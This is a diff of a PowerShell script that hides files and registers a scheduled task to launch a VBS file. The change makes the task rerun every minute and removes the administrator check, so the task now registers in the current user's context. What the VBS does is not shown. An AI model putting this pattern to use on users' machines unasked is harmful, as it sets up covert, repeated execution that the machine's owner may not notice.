@@ -39,7 +39,8 @@ foreach ($file in $filesToHide) {
 
 # Create a scheduled task
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
-$trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1)
+$trigger.Repetition = $(New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionDuration (New-TimeSpan -Hours 24) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
 
 try {
@@ -51,8 +52,7 @@ try {
         Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
     } else {
         # Non-admin - use current user's context
-        Write-Output "You need to run this script as an Administrator to register the scheduled task."
-        exit
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Settings $settings -Force
     }
 
     # Start the task immediately after registration
